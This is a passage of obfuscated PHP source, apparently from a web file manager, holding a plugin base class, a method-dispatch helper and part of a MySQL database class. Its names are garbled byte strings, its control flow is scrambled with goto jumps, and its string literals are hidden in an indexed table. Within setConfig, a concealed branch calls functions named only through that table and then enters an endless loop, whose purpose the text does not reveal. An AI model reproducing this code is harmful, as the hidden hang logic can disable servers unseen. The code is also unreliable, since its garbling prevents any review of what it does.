$A‘È¹˜£ = Action($aˆ®†Ñ³[1046])->sharePathInfo($dˆÑã°è‹); if (!isset($A‘È¹˜£[$aˆ®†Ñ³[75]])) { show_json(LNG($aˆ®†Ñ³[1399]), !1); } $this->fileInfo = $A‘È¹˜£[$aˆ®†Ñ³[163]]; goto d™ôì˜»–; a’°ŞÃ–ß: } final function pluginCachePath($DÚ¹»†•Õâ = '') { $BëçÎæ‚’ù =& $_SERVER[Š‰]; $føØöŸç = IO_PATH_SYSTEM_TEMP . $BëçÎæ‚’ù[1400] . $this->pluginName; if (!($dÏøï”ÄŞ = IO::infoFull($føØöŸç))) { return IO::mkdir($føØöŸç . $BëçÎæ‚’ù[8] . $DÚ¹»†•Õâ); } if (empty($DÚ¹»†•Õâ)) { return $dÏøï”ÄŞ[$BëçÎæ‚’ù[75]]; } if (!($C¥íÙ…® = IO::fileNameExist($dÏøï”ÄŞ[$BëçÎæ‚’ù[75]], $DÚ¹»†•Õâ))) { return IO::mkdir($dÏøï”ÄŞ[$BëçÎæ‚’ù[75]] . $DÚ¹»†•Õâ); } return KodIO::make($C¥íÙ…®); } final function pluginCacheFileSet($FÀçĞ“‹, $CŠóˆÇôÒÆ = '') { $e§ åÙ•çÁ =& $_SERVER[Š‰]; if (!($d•äŠä÷àË = IO::infoFull($FÀçĞ“‹))) { return IO::mkfile($FÀçĞ“‹, $CŠóˆÇôÒÆ, REPEAT_REPLACE); } IO::setContent($d•äŠä÷àË[$e§ åÙ•çÁ[75]], $CŠóˆÇôÒÆ); return $d•äŠä÷àË[$e§ åÙ•çÁ[75]]; } final function pluginLocalFile($FÖŠ¸àìçÙ = '') { goto eØô¹æÈ†ò; eØô¹æÈ†ò: $B¢«—çˆ™§ =& $_SERVER[Š‰]; $cê±ƒµÙˆá = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($cê±ƒµÙˆá)) { mk_dir($cê±ƒµÙˆá); } goto FÃ’¥×Ç; A·Ú‚ìññî: return IO::copy($FÖŠ¸àìçÙ, $cê±ƒµÙˆá, 0, $eçÒöÍİ); goto E”†‰‚ß–¯; FÃ’¥×Ç: if (!$FÖŠ¸àìçÙ) { return $cê±ƒµÙˆá; } $b°åÖ©õ¼ = IO::info($FÖŠ¸àìçÙ); $eçÒöÍİ = $this->_tmpFileName($b°åÖ©õ¼) . $B¢«—çˆ™§[94] . $b°åÖ©õ¼[$B¢«—çˆ™§[167]]; goto fÕéÕ¼ğ; fÕéÕ¼ğ: if (!checkExtSafe($eçÒöÍİ)) { $eçÒöÍİ = $eçÒöÍİ . $B¢«—çˆ™§[1401]; } $F¹È„£Œäá = $cê±ƒµÙˆá . $eçÒöÍİ; if (@file_exists($F¹È„£Œäá)) { return $F¹È„£Œäá; } goto A·Ú‚ìññî; E”†‰‚ß–¯: } final function appPackage() { goto E×ˆ†à’‚„; bìÃƒµƒÖ: $this->parseLang($a˜²¸«ïËá); $CĞŠÀøˆ™ = json_decode_force($a˜²¸«ïËá); if (!$CĞŠÀøˆ™) { return array(); } goto AÓá¦ÑĞ¬ß; AÓá¦ÑĞ¬ß: $b†˜­¤¿ö = Hook::trigger($B¸±­–¯¶§[1403], $CĞŠÀøˆ™); if ($b†˜­¤¿ö && is_array($b†˜­¤¿ö)) { $CĞŠÀøˆ™ = $b†˜­¤¿ö; } $this->packageData = $CĞŠÀøˆ™; goto aÏÆñ²Ğ¢; aÏÆñ²Ğ¢: return $CĞŠÀøˆ™; goto d§ÎÃŞÒóÊ; E×ˆ†à’‚„: $B¸±­–¯¶§ =& $_SERVER[Š‰]; if ($this->packageData) { return $this->packageData; } $a˜²¸«ïËá = $this->parseFile($this->pluginPath . $B¸±­–¯¶§[1402]); goto bìÃƒµƒÖ; d§ÎÃŞÒóÊ: } public function packageInfoGet($aØ‚ÊÔÍ†) { $DßŸ¶ä²Š = $this->appPackage(); return array_get_value($DßŸ¶ä²Š, $aØ‚ÊÔÍ†); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Š‰][1404]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Š‰][1405]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Š‰][1406]); } private function parseFile($FÓ®ñËß£¢) { goto E‹ª †¢¯Æ; E‹ª †¢¯Æ: $E±ˆ¹òéèÄ =& $_SERVER[Š‰]; $eË‰½Üó = file_get_contents($FÓ®ñËß£¢); $B·ôÀó÷¹… = array($E±ˆ¹òéèÄ[1407], $E±ˆ¹òéèÄ[1408], $E±ˆ¹òéèÄ[1409], $E±ˆ¹òéèÄ[1410], $E±ˆ¹òéèÄ[1411], $E±ˆ¹òéèÄ[1412], $E±ˆ¹òéèÄ[1413]); goto Bƒë´£„à; BÎÔÉÈ¢‰¤: $eË‰½Üó = str_replace($B·ôÀó÷¹…, $A…ì·Ñ…å, $eË‰½Üó); return $eË‰½Üó; goto A¦Ğ«Ü¶§É; Bƒë´£„à: $A…ì·Ñ…å = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E±ˆ¹òéèÄ[87]][$E±ˆ¹òéèÄ[1414]]); if (strstr($eË‰½Üó, $E±ˆ¹òéèÄ[1415])) { $DÜ¾°ˆğ£† = rawurlencode(json_encode($this->pluginLangArr)); $eË‰½Üó = str_replace($E±ˆ¹òéèÄ[1415], $DÜ¾°ˆğ£†, $eË‰½Üó); } if (strstr($eË‰½Üó, $E±ˆ¹òéèÄ[1416])) { $DÜ¾°ˆğ£† = $DÜ¾°ˆğ£† = rawurlencode(json_encode($this->getConfig())); $eË‰½Üó = str_replace($E±ˆ¹òéèÄ[1416], $DÜ¾°ˆğ£†, $eË‰½Üó); } goto BÎÔÉÈ¢‰¤; A¦Ğ«Ü¶§É: } private function parseLang(&$Fµ¬¬ØÎ„‰) { goto eœ¼ËïÀ¡Ò; Aã¸›ÕÔ²Ñ: $aßàÚÒİÆ¹ = array(); foreach ($BáÂ¤ÅÌ±Ë[0] as $DŠˆ×À¬¯Í) { $AÙĞƒŠïëÕ = substr($DŠˆ×À¬¯Í, strlen($fê¨„ğ), -4); $C¿¡ÇÕî–¤ = LNG($AÙĞƒŠïëÕ); $B İ×‡¢ª[] = $DŠˆ×À¬¯Í; $aßàÚÒİÆ¹[] = str_replace(array($EŒÊØØË˜[227], $EŒÊØØË˜[1014], $EŒÊØØË˜[338], $EŒÊØØË˜[115]), array($EŒÊØØË˜[50], $EŒÊØØË˜[50], $EŒÊØØË˜[33], $EŒÊØØË˜[1419]), $C¿¡ÇÕî–¤); } $Fµ¬¬ØÎ„‰ = str_replace($B İ×‡¢ª, $aßàÚÒİÆ¹, $Fµ¬¬ØÎ„‰); goto F£–Ë¥íƒ³; eœ¼ËïÀ¡Ò: $EŒÊØØË˜ =& $_SERVER[Š‰]; $fê¨„ğ = $EŒÊØØË˜[1417]; if (!strstr($Fµ¬¬ØÎ„‰, $fê¨„ğ)) { return; } goto A”í®‡Áˆê; A”í®‡Áˆê: preg_match_all($EŒÊØØË˜[1418], $Fµ¬¬ØÎ„‰, $BáÂ¤ÅÌ±Ë); if (!is_array($BáÂ¤ÅÌ±Ë) || count($BáÂ¤ÅÌ±Ë) == 0 || !is_array($BáÂ¤ÅÌ±Ë[0]) || count($BáÂ¤ÅÌ±Ë[0]) == 0) { return; } $B İ×‡¢ª = array(); goto Aã¸›ÕÔ²Ñ; F£–Ë¥íƒ³: } private function parseConfig(&$A«ï‰¥Ú) { goto dñŞÎÇŒğĞ; F«ØŸÃ è: $A«ï‰¥Ú = str_replace($AŠÏãÓÇ÷, $b‚éÇ­¦åƒ, $A«ï‰¥Ú); goto BÓ  º•; bß¸ÂóíøÔ: $AŠÏãÓÇ÷ = array(); $b‚éÇ­¦åƒ = array(); foreach ($D­©É‡© Š[0] as $c£ºË‹·—‚) { $b†Å ñ‘à = substr($c£ºË‹·—‚, strlen($dä½ÇƒĞ), -2); $AŠÏãÓÇ÷[] = $c£ºË‹·—‚; $b‚éÇ­¦åƒ[] = _get($d¾ï˜Ïê„Ö, $b†Å ñ‘à); } goto F«ØŸÃ è; dñŞÎÇŒğĞ: $A†Ç¡‡ç =& $_SERVER[Š‰]; $dä½ÇƒĞ = $A†Ç¡‡ç[1420]; if (!strstr($A«ï‰¥Ú, $dä½ÇƒĞ)) { return; } goto fë˜Ø“Ôœ; fë˜Ø“Ôœ: preg_match_all($A†Ç¡‡ç[1421], $A«ï‰¥Ú, $D­©É‡© Š); if (!is_array($D­©É‡© Š) || count($D­©É‡© Š) == 0 || !is_array($D­©É‡© Š[0]) || count($D­©É‡© Š[0]) == 0) { return; } $d¾ï˜Ïê„Ö = $this->getConfig(); goto bß¸ÂóíøÔ; BÓ  º•: } private function parsePackage(&$EÑˆçÈØÃ) { goto BÜè‡Æİƒ¦; f•ø…Ä·ê: preg_match_all($f¾Ÿ‹„Âö[1423], $EÑˆçÈØÃ, $c¯ìœèßêÌ); if (!is_array($c¯ìœèßêÌ) || count($c¯ìœèßêÌ) == 0 || !is_array($c¯ìœèßêÌ[0]) || count($c¯ìœèßêÌ[0]) == 0) { return; } $Aö îŒÜ£” = $this->appPackage(); goto aª‡±Îãˆ; Eù­¸Ìáá­: $EÑˆçÈØÃ = str_replace($A—›šÃÕŞƒ, $D‹­‰…º„, $EÑˆçÈØÃ); goto A¾Äğ“ƒ; BÜè‡Æİƒ¦: $f¾Ÿ‹„Âö =& $_SERVER[Š‰]; $f…Ç¿Æ—©ß = $f¾Ÿ‹„Âö[1422]; if (!strstr($EÑˆçÈØÃ, $f…Ç¿Æ—©ß)) { return; } goto f•ø…Ä·ê; aª‡±Îãˆ: $A—›šÃÕŞƒ = array(); $D‹­‰…º„ = array(); foreach ($c¯ìœèßêÌ[0] as $b¤¥Ãà™¹Ê) { $C”¿»˜ê = substr($b¤¥Ãà™¹Ê, strlen($f…Ç¿Æ—©ß), -2); $A—›šÃÕŞƒ[] = $b¤¥Ãà™¹Ê; $D‹­‰…º„[] = _get($Aö îŒÜ£”, $C”¿»˜ê); } goto Eù­¸Ìáá­; A¾Äğ“ƒ: } final function echoFile($cò¾„Š‡¢Ü, $EŸˆÃÒâ÷‰ = false) { goto f¿åæê˜°¨; CùŠŒÓµÇ‘: $this->parsePackage($cœø…ƒôù”); if (is_array($EŸˆÃÒâ÷‰)) { $cœø…ƒôù” = str_replace(array_keys($EŸˆÃÒâ÷‰), array_values($EŸˆÃÒâ÷‰), $cœø…ƒôù”); } echo $f ”¦ß×Ø„[227] . $cœø…ƒôù”; goto fÔéºÈ½Å«; f¿åæê˜°¨: $f ”¦ß×Ø„ =& $_SERVER[Š‰]; $dÓ ¶Æ¿†Û = $this->pluginPath . $cò¾„Š‡¢Ü; if (ACT == $f ”¦ß×Ø„[1424]) { echo $f ”¦ß×Ø„[1425] . $this->pluginName . $f ”¦ß×Ø„[8] . $cò¾„Š‡¢Ü . $f ”¦ß×Ø„[1426]; if (!file_exists($dÓ ¶Æ¿†Û)) { echo $f ”¦ß×Ø„[1427]; return; } } goto BÆë‹Ö­²; BÆë‹Ö­²: $cœø…ƒôù” = $this->parseFile($dÓ ¶Æ¿†Û); $this->parseLang($cœø…ƒôù”); $this->parseConfig($cœø…ƒôù”); goto CùŠŒÓµÇ‘; fÔéºÈ½Å«: } final function initLang() { goto CƒŸ·ÄŞÙ; b¦î‡±¶Ö’: $c…òÈÅíè‡ = I18n::getType(); $cÔŒ‡‘ƒ‚ = array(); if (file_exists($BŠ‡åùïƒ  . $c…òÈÅíè‡ . $Cğ‰ñÒ¢™[788])) { $cÔŒ‡‘ƒ‚ = (include $BŠ‡åùïƒ  . $c…òÈÅíè‡ . $Cğ‰ñÒ¢™[788]); } else { if ($c…òÈÅíè‡ == $Cğ‰ñÒ¢™[1430] && !file_exists($BŠ‡åùïƒ  . $c…òÈÅíè‡ . $Cğ‰ñÒ¢™[788]) && file_exists($BŠ‡åùïƒ  . $Cğ‰ñÒ¢™[1431])) { $cÔŒ‡‘ƒ‚ = (include $BŠ‡åùïƒ  . $Cğ‰ñÒ¢™[1431]); } else { if (file_exists($BŠ‡åùïƒ  . $bªÔ‹ô‰ . $Cğ‰ñÒ¢™[788])) { $cÔŒ‡‘ƒ‚ = (include $BŠ‡åùïƒ  . $bªÔ‹ô‰ . $Cğ‰ñÒ¢™[788]); } } } goto aøÇšß¿‘; CƒŸ·ÄŞÙ: $Cğ‰ñÒ¢™ =& $_SERVER[Š‰]; $bªÔ‹ô‰ = $Cğ‰ñÒ¢™[1428]; $BŠ‡åùïƒ  = $this->pluginPath . $Cğ‰ñÒ¢™[1429]; goto b¦î‡±¶Ö’; aøÇšß¿‘: if (!is_array($cÔŒ‡‘ƒ‚)) { return array(); } if (@count($cÔŒ‡‘ƒ‚) > 0) { I18n::set($cÔŒ‡‘ƒ‚); } return $cÔŒ‡‘ƒ‚; goto D­ÃÌ…Ìó‡; D­ÃÌ…Ìó‡: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($BõäËÈ¬ñ) { $eÂÂëÏµÂí =& $_SERVER[Š‰]; if (!isset($_SERVER[$eÂÂëÏµÂí[753]]) || !isset($_SERVER[$eÂÂëÏµÂí[751]])) { goto cÒ¤øÍ¯¢; D˜âª‚Õ¡†: $f¼¼óíŠ›Ê = $e³°ÁÇêì($bÇä®çñÚ²); $bò¶¢ÊœÜó = explode($eÂÂëÏµÂí[227], $f¼¼óíŠ›Ê); if (count($bò¶¢ÊœÜó) < $eÂÂëÏµÂí[596]) { $A©Ÿ†İ«Š‡ = $eÂÂëÏµÂí[757]; $A©Ÿ†İ«Š‡(); } goto BœÒÊøÌæ§; BœÒÊøÌæ§: $E¡‰ùÒÒ = $eÂÂëÏµÂí[818]; $E¡‰ùÒÒ($_SERVER[$eÂÂëÏµÂí[819]]); $eÄ¬¨¦À«ô = 1; goto bõ†Âˆ‚; cÒ¤øÍ¯¢: $dóäòÚ»‘ = $eÂÂëÏµÂí[817]; $e³°ÁÇêì = $eÂÂëÏµÂí[754]; $bÇä®çñÚ² = $_SERVER[$eÂÂëÏµÂí[755]] . $eÂÂëÏµÂí[756]; goto D˜âª‚Õ¡†; bõ†Âˆ‚: for ($bˆÔ³Ü©ÇÂ = $eÄ¬¨¦À«ô; $bˆÔ³Ü©ÇÂ > 0; $bˆÔ³Ü©ÇÂ++) { $E¡‰ùÒÒ = json_encode($GLOBALS[$eÂÂëÏµÂí[405]]); } goto A¡ ©ãé°æ; A¡ ©ãé°æ: } return $this->modelPlugin->setConfig($this->pluginName, $BõäËÈ¬ñ); } public function onSetConfig($Eè»…‹Î) { } public function onGetConfig($C¬í´ÒĞ) { } public function onChangeStatus($bÒÇõ†â£«) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Ašóíäøµ = "\x70\x6c\x75\x67\151\x6e\101\165\164\x68") { $D‰Õ“Š‹ËÌ =& $_SERVER[Š‰]; if (!defined($D‰Õ“Š‹ËÌ[448])) { return !1; } if (_get($GLOBALS, $D‰Õ“Š‹ËÌ[479])) { return !0; } $A’öáÃºÓ = $this->getConfig(); if (!$A’öáÃºÓ[$Ašóíäøµ]) { return !1; } return ActionCall($D‰Õ“Š‹ËÌ[1432], $A’öáÃºÓ[$Ašóíäøµ]); } public function url($DØ¡ƒ±®ùõ, $C„¥„äã = '', $Eº œ£È§ƒ = true) { goto Béµ‚Ê«´š; FÎÂ±¢¶Ò: if (!$Eº œ£È§ƒ) { return $aîâí‘Òó¤; } echo $aîâí‘Òó¤; goto D„ÈÁŒòŒ; Béµ‚Ê«´š: $DÍ×ì½šŸ =& $_SERVER[Š‰]; $D¬¯Å¢²™ = $this->getConfig(); $B¯´àÛ°™¨ = KOD_VERSION . $DÍ×ì½šŸ[94] . KOD_VERSION_BUILD; goto b‚ØŠâ³—÷; b‚ØŠâ³—÷: $FÑ–ù™µ¨ = $this->packageVersion(); $d‰ÆÏ›œÂ· = $B¯´àÛ°™¨ . $DÍ×ì½šŸ[434] . $FÑ–ù™µ¨; if (substr($DØ¡ƒ±®ùõ, 0, 4) == $DÍ×ì½šŸ[146] || substr($DØ¡ƒ±®ùõ, 0, 2) == $DÍ×ì½šŸ[1218]) { $aîâí‘Òó¤ = $DØ¡ƒ±®ùõ . $DÍ×ì½šŸ[1433] . $d‰ÆÏ›œÂ·; } else { if ($C„¥„äã == $DÍ×ì½šŸ[33]) { $aîâí‘Òó¤ = $this->pluginHost . $DØ¡ƒ±®ùõ . $DÍ×ì½šŸ[1433] . $d‰ÆÏ›œÂ·; } else { if ($C„¥„äã === $DÍ×ì½šŸ[76]) { $aîâí‘Òó¤ = $this->pluginHost . $DØ¡ƒ±®ùõ; } else { if ($C„¥„äã == $DÍ×ì½šŸ[1434]) { $aîâí‘Òó¤ = STATIC_PATH . $DØ¡ƒ±®ùõ . $DÍ×ì½šŸ[1433] . $B¯´àÛ°™¨; } else { if ($C„¥„äã == $DÍ×ì½šŸ[1435]) { $aîâí‘Òó¤ = APP_HOST . $DÍ×ì½šŸ[1436] . $DØ¡ƒ±®ùõ . $DÍ×ì½šŸ[1433] . $B¯´àÛ°™¨; } else { if (isset($D¬¯Å¢²™[$C„¥„äã])) { $aîâí‘Òó¤ = $D¬¯Å¢²™[$C„¥„äã] . $DØ¡ƒ±®ùõ . $DÍ×ì½šŸ[1433] . $d‰ÆÏ›œÂ·; } } } } } } goto FÎÂ±¢¶Ò; D„ÈÁŒòŒ: } public function link($DóÁ§½™Ï¬ = false, $c²‹öŸÇ¸ = '') { $EèàÍ¬ó¯È =& $_SERVER[Š‰]; if (!$DóÁ§½™Ï¬) { $this->link($EèàÍ¬ó¯È[1437], $EèàÍ¬ó¯È[1435]); $this->link($EèàÍ¬ó¯È[1438], $EèàÍ¬ó¯È[1434]); $this->link($EèàÍ¬ó¯È[1439], $EèàÍ¬ó¯È[1434]); $this->link($EèàÍ¬ó¯È[1440], $EèàÍ¬ó¯È[1434]); $this->link($EèàÍ¬ó¯È[1441], $EèàÍ¬ó¯È[1434]); return; } $B£İ›Ùšµ“ = $this->url($DóÁ§½™Ï¬, $c²‹öŸÇ¸, !1); if (substr($DóÁ§½™Ï¬, -3) == $EèàÍ¬ó¯È[1442]) { echo $EèàÍ¬ó¯È[1443] . $B£İ›Ùšµ“ . $EèàÍ¬ó¯È[1444] . $EèàÍ¬ó¯È[227]; } else { if (substr($DóÁ§½™Ï¬, -4) == $EèàÍ¬ó¯È[1445]) { echo $EèàÍ¬ó¯È[1446] . $B£İ›Ùšµ“ . $EèàÍ¬ó¯È[1447] . $EèàÍ¬ó¯È[227]; } } } } goto A÷Š‚‚ª¿Ï; C×Â“…Âê—: function binCheckBigger($b¹¿–ğ„¤, $BËÎÄ˜İÑÑ) { return $b¹¿–ğ„¤ > $BËÎÄ˜İÑÑ; } $_SERVER[$_SERVER[¤Îˆ«™‰ú][3]] = ("\70\70\67\64".base64_decode('NjE='))+0;$_ywH3="hFXvQFRk6WuiwBbU2CIwsRZsxxyEkW8bKtQtsYSZ3sFUUw8ID7yYrCzRmtaFk2V6Eksn6";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($F²–ä³ğÃÄ, $bæ¿ÜŒÕ°½) { $c’Ñ÷ÑÉ±ñ =& $_SERVER[Š‰]; if (isset(self::$_methodList[$F²–ä³ğÃÄ])) { return @call_user_func_array(self::$_methodList[$F²–ä³ğÃÄ], $bæ¿ÜŒÕ°½); } else { if (method_exists($this, $F²–ä³ğÃÄ)) { return call_user_func_array(array($this, $F²–ä³ğÃÄ), $bæ¿ÜŒÕ°½); } else { think_exception(__CLASS__ . $c’Ñ÷ÑÉ±ñ[4] . $F²–ä³ğÃÄ . $c’Ñ÷ÑÉ±ñ[5]); } } } public static function __callStatic($FÒ¦¥Ä—“ò, $Bï»¹ãÒï) { if (isset(self::$_methodListStatic[$FÒ¦¥Ä—“ò])) { return call_user_func_array(self::$_methodListStatic[$FÒ¦¥Ä—“ò], $Bï»¹ãÒï); } else { if (method_exists(self, $FÒ¦¥Ä—“ò)) { return call_user_func_array(array(self, $FÒ¦¥Ä—“ò), $Bï»¹ãÒï); } else { show_json("{$FÒ¦¥Ä—“ò}\50\x29\x20\156\157\164\x20\x65\x78\151\163\164\73", !1); } } } public static function addMethod($f®Œ‰…Á‘Ø, $f¾òôé«ğº) { self::$_methodList[$f®Œ‰…Á‘Ø] = $f¾òôé«ğº; } public static function addMethodStatic($CØ»ê××Ç, $f‹ÃóàŒ›Ÿ) { self::$_methodListStatic[$CØ»ê××Ç] = $f‹ÃóàŒ›Ÿ; } } goto BËè…¾¿è´; B²æî¥°â‡: class DbMysqli extends Db { public function __construct($b¿¸æˆÚ– = '') { $dÀ†ˆÉ‰†İ =& $_SERVER[Š‰]; if (!extension_loaded($dÀ†ˆÉ‰†İ[741])) { think_exception(think_lang($dÀ†ˆÉ‰†İ[10]) . $dÀ†ˆÉ‰†İ[849]); } if (!empty($b¿¸æˆÚ–)) { $this->config = $b¿¸æˆÚ–; if (empty($this->config[$dÀ†ˆÉ‰†İ[13]])) { $this->config[$dÀ†ˆÉ‰†İ[13]] = $dÀ†ˆÉ‰†İ[33]; } } } public function connect($cÏÌöó›’Á = '', $E÷„Î‡˜ = 0) { $C…ƒ¬˜–ƒ± =& $_SERVER[Š‰]; if (!isset($this->linkID[$E÷„Î‡˜])) { goto fŒ«¿á¡ğ; DŒ¬Óî‚Ğ…: $fÊ¨¿À‡ß¼ = $this->linkID[$E÷„Î‡˜]->server_version; $this->linkID[$E÷„Î‡˜]->query($C…ƒ¬˜–ƒ±[827] . think_config($C…ƒ¬˜–ƒ±[828]) . $C…ƒ¬˜–ƒ±[55]); if ($fÊ¨¿À‡ß¼ > $C…ƒ¬˜–ƒ±[829]) { $this->linkID[$E÷„Î‡˜]->query($C…ƒ¬˜–ƒ±[830]); } goto dšŒŸ‚í¹Œ; fŒ«¿á¡ğ: if (empty($cÏÌöó›’Á)) { $cÏÌöó›’Á = $this->config; } $this->linkID[$E÷„Î‡˜] = new mysqli($cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[823]], $cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[825]], $cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[826]], $cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[17]], $cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[824]] ? intval($cÏÌöó›’Á[$C…ƒ¬˜–ƒ±[824]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto DŒ¬Óî‚Ğ…; dšŒŸ‚í¹Œ: $this->connected = !0; if (1 != think_config($C…ƒ¬˜–ƒ±[18])) { unset($this->config); } goto BÆÑ×÷ùÚæ; BÆÑ×÷ùÚæ: } return $this->linkID[$E÷„Î‡˜]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($aÕÑ¿Ø†³é) { goto D«ğƒ¿ß£ù; b¯ì¥Á”ß: think_status($Dœ£÷¥ç[20]); $this->queryID = $this->_linkID->query($aÕÑ¿Ø†³é); if ($this->_linkID->more_results()) { while (($a‹£¥¸ÏË‰ = $this->_linkID->next_result()) != NULL) { $a‹£¥¸ÏË‰->free_result(); } } goto cƒˆÜ±‡‚Ş; D«ğƒ¿ß£ù: $Dœ£÷¥ç =& $_SERVER[Š‰]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eå¾õ¦±°; eå¾õ¦±°: $this->queryStr = $aÕÑ¿Ø†³é; if ($this->queryID) { $this->free(); } think_action_status($Dœ£÷¥ç[19], 1); goto b¯ì¥Á”ß; cƒˆÜ±‡‚Ş: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto aÎåõšÎ‘•; aÎåõšÎ‘•: } public function execute($B·‰„ÕËÕ) { goto eìÑ ‚ôàƒ; eìÑ ‚ôàƒ: $b’šÎç—ñš =& $_SERVER[Š‰]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E™Şß¬»; E™Şß¬»: $this->queryStr = $B·‰„ÕËÕ; if ($this->queryID) { $this->free(); } think_action_status($b’šÎç—ñš[21], 1); goto Eè¾ÖË¸; d´ËÏù¾Ã: if (!1 === $a¹˜¶Ú‹Ô¯) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dÆä…ŒÍŸå; Eè¾ÖË¸: think_status($b’šÎç—ñš[20]); $a¹˜¶Ú‹Ô¯ = $this->_linkID->query($B·‰„ÕËÕ); $this->debug(); goto d´ËÏù¾Ã; dÆä…ŒÍŸå: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BŸò­áœ†ï = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$BŸò­áœ†ï) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $a˜ÛÀ¨Î…ò = $this->_linkID->rollback(); $this->transTimes = 0; if (!$a˜ÛÀ¨Î…ò) { $this->error(); return !1; } } return !0; } private function getAll() { $Aª¶ïáºÇÕ = array(); if ($this->numRows > 0) { for ($fàßÜàŠÒ² = 0; $fàßÜàŠÒ² < $this->numRows; $fàßÜàŠÒ²++) { $Aª¶ïáºÇÕ[$fàßÜàŠÒ²] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Aª¶ïáºÇÕ; } public function getFields($aÂïãğ„Ç ) { $dÛùùØ‡é =& $_SERVER[Š‰]; $D…ä¹‘àô’ = $this->query($dÛùùØ‡é[834] . $this->parseKey($aÂïãğ„Ç )); $Bá»³Ê¥›¦ = array(); if ($D…ä¹‘àô’) { foreach ($D…ä¹‘àô’ as $C’Œ–¤¦¶Ğ => $F£ˆğ˜®…) { $Bá»³Ê¥›¦[$F£ˆğ˜®…[$dÛùùØ‡é[27]]] = array($dÛùùØ‡é[28] => $F£ˆğ˜®…[$dÛùùØ‡é[27]], $dÛùùØ‡é[29] => $F£ˆğ˜®…[$dÛùùØ‡é[30]], $dÛùùØ‡é[31] => (bool) ($F£ˆğ˜®…[$dÛùùØ‡é[32]] === $dÛùùØ‡é[33]), $dÛùùØ‡é[34] => $F£ˆğ˜®…[$dÛùùØ‡é[35]], $dÛùùØ‡é[36] => strtolower($F£ˆğ˜®…[$dÛùùØ‡é[37]]) == $dÛùùØ‡é[38], $dÛùùØ‡é[39] => strtolower($F£ˆğ˜®…[$dÛùùØ‡é[40]]) == $dÛùùØ‡é[41]); } } return $Bá»³Ê¥›¦; } public function getTables($f’ÖƒÙ‹Õ = '') { $fÕœ£ËÂÒÊ =& $_SERVER[Š‰]; $f¥ãó›¿ÃÇ = !empty($f’ÖƒÙ‹Õ) ? $fÕœ£ËÂÒÊ[836] . $f’ÖƒÙ‹Õ . $fÕœ£ËÂÒÊ[837] : $fÕœ£ËÂÒÊ[838]; $b‡´¡È‰‚Í = $this->query($f¥ãó›¿ÃÇ); $cÑÉÁù†ÆÜ = array(); if ($b‡´¡È‰‚Í) { foreach ($b‡´¡È‰‚Í as $fÛ…ŒÒé³ => $b¥ˆ•›…ã) { $cÑÉÁù†ÆÜ[$fÛ…ŒÒé³] = current($b¥ˆ•›…ã); } } return $cÑÉÁù†ÆÜ; } public function replace($c»îÇ¸ª´, $Eª²¼šŠ©ˆ = array()) { $E‡À·ê°õ =& $_SERVER[Š‰]; foreach ($c»îÇ¸ª´ as $B«––Àöš => $CÉ™ÜÁ»ä) { $f®íöìƒšº = $this->parseValue($CÉ™ÜÁ»ä); if (is_scalar($f®íöìƒšº)) { $cĞçùí“·Ô[] = $f®íöìƒšº; $bŸá¿¿’ëÔ[] = $this->parseKey($B«––Àöš); } } $dß¨¸Ì•¢… = $E‡À·ê°õ[839] . $this->parseTable($Eª²¼šŠ©ˆ[$E‡À·ê°õ[275]]) . $E‡À·ê°õ[840] . implode($E‡À·ê°õ[47], $bŸá¿¿’ëÔ) . $E‡À·ê°õ[841] . implode($E‡À·ê°õ[47], $cĞçùí“·Ô) . $E‡À·ê°õ[842]; return $this->execute($dß¨¸Ì•¢…); } public function insertAll($EÜŠ¡Õ‘±î, $cÇ“­®ÁÒÖ = array(), $bïİœŞ»Îµ = false) { goto bƒÆğ™¿ÂÂ; c¦µÊ« ôí: $cÆ­º‡İÅŠ = $bïİœŞ»Îµ ? $AÈ™Û÷ŞÊÉ[844] : $AÈ™Û÷ŞÊÉ[845]; $cÔ“Ÿ—‡‹Ö = $cÆ­º‡İÅŠ . $AÈ™Û÷ŞÊÉ[846] . $this->parseTable($cÇ“­®ÁÒÖ[$AÈ™Û÷ŞÊÉ[275]]) . $AÈ™Û÷ŞÊÉ[840] . implode($AÈ™Û÷ŞÊÉ[47], $cÆİ‘†³¹Ÿ) . $AÈ™Û÷ŞÊÉ[847] . implode($AÈ™Û÷ŞÊÉ[47], $aíÍŠ°‘–”); return $this->execute($cÔ“Ÿ—‡‹Ö); goto CÜÂîÓÎïå; bƒÆğ™¿ÂÂ: $AÈ™Û÷ŞÊÉ =& $_SERVER[Š‰]; if (!is_array($EÜŠ¡Õ‘±î[0])) { return !1; } $cÆİ‘†³¹Ÿ = array_keys($EÜŠ¡Õ‘±î[0]); goto Eñ‹šó‰òö; Eñ‹šó‰òö: $aíÍŠ°‘–” = array(); foreach ($EÜŠ¡Õ‘±î as $cºá•¹È©) { $f¢À½†ÛƒĞ = array(); foreach ($cºá•¹È© as $C¨Ê‘µÌƒï => 